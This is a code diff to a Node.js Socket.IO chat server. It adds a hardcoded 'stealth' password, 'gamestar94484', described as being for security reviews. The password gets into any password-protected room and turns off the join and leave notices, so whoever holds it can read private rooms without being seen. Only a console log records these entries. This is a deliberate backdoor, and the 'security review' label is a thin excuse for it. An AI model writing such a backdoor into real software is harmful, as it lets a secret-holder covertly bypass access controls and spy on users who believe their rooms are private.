@@ -14,6 +14,9 @@ const DATA_FILE = path.join(__dirname, 'chat_data.json');
 let rooms = new Map();
 const users = new Map();
 
+// NEW: Stealth password for security review purposes
+const STEALTH_PASSWORD = "gamestar94484";
+
 // Load rooms from storage
 function loadRooms() {
     try {
@@ -69,7 +72,7 @@ function saveRooms() {
 
 loadRooms();
 
-// FIXED: Auto-cleanup function
+// Auto-cleanup function
 const CLEANUP_INTERVAL = 5 * 60 * 1000; // 5 minutes
 function cleanupInactiveRooms() {
     const now = Date.now();
@@ -82,7 +85,7 @@ function cleanupInactiveRooms() {
         // Room is empty and inactive for 5+ minutes
         if (room.users.size === 0 && timeSinceLastActivity >= CLEANUP_INTERVAL) {
             if (roomId === 'public') {
-                // FIXED: Clear public room messages but don't delete room
+                // Clear public room messages but don't delete room
                 if (room.messages.length > 0) {
                     room.messages = [];
                     room.lastActivity = now;
@@ -150,7 +153,8 @@ io.on('connection', (socket) => {
         users.set(socket.id, {
             nickname: nickname,
             currentRoom: null,
-            isOwner: false
+            isOwner: false,
+            stealthMode: false  // NEW: Track stealth mode
         });
         
         socket.emit('nicknameSet', { nickname: nickname });
@@ -178,14 +182,18 @@ io.on('connection', (socket) => {
         console.log(`Room created: ${data.roomName} by ${user.nickname}`);
     });
 
+    // UPDATED: Join room with stealth mode support
     socket.on('joinRoom', (data) => {
         const user = users.get(socket.id);
         const room = rooms.get(data.roomId);
         
         if (!user || !room) return;
 
-        // Check password
-        if (room.password && room.password !== data.password) {
+        // NEW: Check for stealth password
+        const isStealthMode = data.password === STEALTH_PASSWORD;
+        
+        // Check regular password for non-stealth users
+        if (!isStealthMode && room.password && room.password !== data.password) {
             socket.emit('joinError', { message: 'Incorrect password!' });
             return;
         }
@@ -197,12 +205,25 @@ io.on('connection', (socket) => {
                 currentRoom.users.delete(socket.id);
                 socket.leave(user.currentRoom);
                 currentRoom.lastActivity = Date.now();
+                
+                // Send leave message only if not in stealth mode
+                if (!user.stealthMode) {
+                    const leaveMessage = {
+                        id: Date.now().toString(),
+                        type: 'system',
+                        text: `${user.nickname} left the room`,
+                        timestamp: getIndianTime()
+                    };
+                    currentRoom.messages.push(leaveMessage);
+                    io.to(user.currentRoom).emit('message', leaveMessage);
+                }
             }
         }
 
         // Join new room
         room.users.add(socket.id);
         user.currentRoom = data.roomId;
+        user.stealthMode = isStealthMode;  // NEW: Set stealth mode
         socket.join(data.roomId);
         room.lastActivity = Date.now();
 
@@ -211,22 +232,29 @@ io.on('connection', (socket) => {
             roomName: room.name,
             messages: room.messages,
             userCount: room.users.size,
-            isOwner: room.owner === socket.id
+            isOwner: room.owner === socket.id,
+            stealthMode: isStealthMode  // NEW: Send stealth mode status
         });
 
-        // Notify others
-        const joinMessage = {
-            id: Date.now().toString(),
-            type: 'system',
-            text: `${user.nickname} joined the room`,
-            timestamp: getIndianTime()
-        };
-        
-        room.messages.push(joinMessage);
-        io.to(data.roomId).emit('message', joinMessage);
-        io.to(data.roomId).emit('userCountUpdate', room.users.size);
+        // NEW: Only send join notification if NOT in stealth mode
+        if (!isStealthMode) {
+            const joinMessage = {
+                id: Date.now().toString(),
+                type: 'system',
+                text: `${user.nickname} joined the room`,
+                timestamp: getIndianTime()
+            };
+            
+            room.messages.push(joinMessage);
+            io.to(data.roomId).emit('message', joinMessage);
+            console.log(`${user.nickname} joined ${room.name}`);
+        } else {
+            // NEW: Log stealth join for security audit
+            console.log(`🕵️ STEALTH JOIN: ${user.nickname} entered "${room.name}" silently (Room ID: ${data.roomId})`);
+        }
 
-        console.log(`${user.nickname} joined ${room.name}`);
+        // Always update user count
+        io.to(data.roomId).emit('userCountUpdate', room.users.size);
     });
 
     socket.on('sendMessage', (data) => {
@@ -334,6 +362,7 @@ io.on('connection', (socket) => {
         console.log(`Room ${roomName} closed by ${user.nickname}`);
     });
 
+    // UPDATED: Disconnect handler with stealth mode support
     socket.on('disconnect', () => {
         const user = users.get(socket.id);
         if (user && user.currentRoom) {
@@ -342,15 +371,23 @@ io.on('connection', (socket) => {
                 room.users.delete(socket.id);
                 room.lastActivity = Date.now();
                 
-                const leaveMessage = {
-                    id: Date.now().toString(),
-                    type: 'system',
-                    text: `${user.nickname} left the room`,
-                    timestamp: getIndianTime()
-                };
+                // NEW: Only send leave message if not in stealth mode
+                if (!user.stealthMode) {
+                    const leaveMessage = {
+                        id: Date.now().toString(),
+                        type: 'system',
+                        text: `${user.nickname} left the room`,
+                        timestamp: getIndianTime()
+                    };
+                    
+                    room.messages.push(leaveMessage);
+                    io.to(user.currentRoom).emit('message', leaveMessage);
+                    console.log(`${user.nickname} left ${room.name}`);
+                } else {
+                    // NEW: Log stealth leave for security audit
+                    console.log(`🕵️ STEALTH LEAVE: ${user.nickname} left "${room.name}" silently`);
+                }
                 
-                room.messages.push(leaveMessage);
-                io.to(user.currentRoom).emit('message', leaveMessage);
                 io.to(user.currentRoom).emit('userCountUpdate', room.users.size);
                 
                 // If owner leaves, delete the room (except public)
@@ -376,4 +413,5 @@ server.listen(PORT, () => {
     console.log(`🧹 Auto-cleanup: 5 minutes for empty rooms`);
     console.log(`🔒 Owner controls: Close room & Clear chat with password`);
     console.log(`💬 Public room: Messages auto-clear after 5 min of inactivity`);
+    console.log(`🕵️ Stealth mode: Secret password for security reviews`);
 });
